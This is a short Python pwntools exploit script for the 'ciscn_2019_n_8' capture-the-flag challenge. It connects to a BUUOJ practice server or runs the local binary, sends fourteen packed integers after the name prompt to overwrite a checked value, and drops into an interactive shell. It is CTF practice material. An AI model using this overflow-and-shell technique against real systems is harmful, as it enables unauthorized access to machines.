from pwn import * 
from pwn import p32


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./ciscn_2019_n_8")
else:
    host = "node4.buuoj.cn"
    r = connect(host,26602)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')

r.sendlineafter(b'name?',p32(17)*14)

r.interactive()
